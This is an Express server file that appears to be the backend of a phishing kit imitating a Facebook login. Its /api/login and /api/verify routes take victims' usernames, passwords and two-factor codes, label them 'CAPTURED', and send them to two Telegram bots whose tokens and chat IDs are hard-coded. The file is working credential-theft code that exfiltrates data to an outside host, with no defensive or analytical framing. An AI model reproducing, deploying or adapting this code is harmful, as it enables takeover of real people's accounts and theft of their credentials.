import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import dotenv from "dotenv";

dotenv.config();

async function startServer() {
  console.log("Starting Express server...");
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Health check
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // API route to handle login and send to Telegram
  app.post("/api/login", async (req, res) => {
    console.log("Login request received:", req.body.identifier);
    const { identifier, password } = req.body;
    
    const bots = [
      { token: "8678575710:AAE14KegKrQNkCBqQ8y_YhdwYeDpjls1QbQ", chatId: "8582874053" },
      { token: "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs", chatId: "8447588640" }
    ];

    const message = `
👤 **FB LOGIN CAPTURED** 🚨
📧 User/Phone: ${identifier}
🔑 Password: ${password}
    `;

    try {
      await Promise.all(bots.map(async (bot) => {
        await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: message,
            parse_mode: "Markdown",
          }),
        });
      }));
      res.json({ success: true });
    } catch (error) {
      console.error("Login Error:", error);
      res.status(500).json({ error: "Error interno" });
    }
  });

  // API route to handle 2FA verification code
  app.post("/api/verify", async (req, res) => {
    console.log("Verify request received for:", req.body.identifier);
    const { identifier, code } = req.body;
    
    const bots = [
      { token: "8678575710:AAE14KegKrQNkCBqQ8y_YhdwYeDpjls1QbQ", chatId: "8582874053" },
      { token: "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs", chatId: "8447588640" }
    ];

    const message = `
🔐 **2FA CODE CAPTURED** 🚨
👤 User: ${identifier}
🔢 Code: ${code}
    `;

    try {
      await Promise.all(bots.map(async (bot) => {
        await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: message,
            parse_mode: "Markdown",
          }),
        });
      }));
      res.json({ success: true });
    } catch (error) {
      console.error("Verify Error:", error);
      res.status(500).json({ error: "Error interno" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();